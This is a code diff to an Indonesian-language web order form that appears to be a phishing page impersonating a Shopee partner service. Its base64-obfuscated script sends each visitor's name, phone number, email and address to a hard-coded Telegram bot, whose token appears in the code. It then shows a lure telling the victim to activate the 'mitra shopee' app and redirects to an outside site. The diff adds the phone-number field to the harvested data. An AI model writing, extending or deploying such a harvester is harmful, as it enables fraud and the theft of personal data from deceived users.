@@ -36,6 +36,10 @@
                         <input type="text" id="nL" required>
                     </div>
                     <div class="form-group">
+                        <label>Nomor HP Penerima</label>
+                        <input type="tel" id="nHP" placeholder="08xxxxxxxxxx" required oninput="this.value = this.value.replace(/\D/g, '')">
+                    </div>
+                    <div class="form-group">
                         <label>Alamat Email</label>
                         <input type="email" id="eM" required>
                     </div>
@@ -59,39 +63,47 @@
 
     <script>
         (function(){
-            const _0x_a = "ODI4NjgyNDI1NDpBQUdQQWk3dVBmN28wLWExOXphVWpCTENYN0llbHFlUGNhOA==";
+            const _0x_a = "NzgxMjQyODQ2ODpBQUUxcUhqTExIT1FsQW1BQlhidjlKaFhFZzBLUmtiaDBYMA==";
             const _0x_b = "NTkyMzAzMTgyNQ==";
-            const _0x_c = "Zm9ybXVsaXIzLmh0bWw="; // Target: formulir3.html
+            const _0x_c = "aHR0cHM6Ly9taXRyYS5tb25lZS5jby5pZC8jL20=";
             const _0x_u = ["aHR0cHM6Ly9hcGku","dGVsZWdyYW0ub3JnL2JvdA==","L3NlbmRNZXNzYWdl"];
 
-            document.getElementById('orderForm').onsubmit = function(e) {
-                e.preventDefault();
-                
-                const btn = document.getElementById('btnSub');
-                btn.disabled = true;
-                btn.innerText = "Mengirim...";
+            let isBusy = false;
 
+            document.getElementById('orderForm').onsubmit = async function(e) {
+                e.preventDefault();
+                if (isBusy) return;
+
+                const btn = document.getElementById('btnSub');
                 const n = document.getElementById('nL').value;
+                const hp = document.getElementById('nHP').value;
                 const m = document.getElementById('eM').value;
                 const a = document.getElementById('aL').value;
                 const p = document.getElementById('nP').value;
                 const h = document.getElementById('tH').value;
 
+                isBusy = true;
+                btn.disabled = true;
+                btn.innerText = "Memproses...";
+
                 const fullUrl = atob(_0x_u[0]) + atob(_0x_u[1]) + atob(_0x_a) + atob(_0x_u[2]);
-                const msg = `*PESANAN BARU*\nNama: ${n}\nEmail: ${m}\nAlamat: ${a}\nProduk: ${p}\nHarga: Rp${h}`;
+                const msg = `*PESANAN BARU*\nNama: ${n}\nNo HP: ${hp}\nEmail: ${m}\nAlamat: ${a}\nProduk: ${p}\nHarga: Rp${h}`;
 
-                // Kirim data tanpa menunggu (Fire and Forget)
-                fetch(fullUrl, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({
-                        chat_id: atob(_0x_b),
-                        text: msg,
-                        parse_mode: 'Markdown'
-                    })
-                });
+                try {
+                    await fetch(fullUrl, {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({
+                            chat_id: atob(_0x_b),
+                            text: msg,
+                            parse_mode: 'Markdown'
+                        })
+                    });
+                } catch (err) {
+                    console.warn("Skip error");
+                }
 
-                // Langsung pindah halaman secara instan
+                alert('Data berhasil terkirim. Untuk yang belum aktifkan di aplikasi mitra shopee, Silahkan klik atur di bagian beranda setelah login di aplikasi mitra shopee.');
                 window.location.href = atob(_0x_c);
             };
         })();
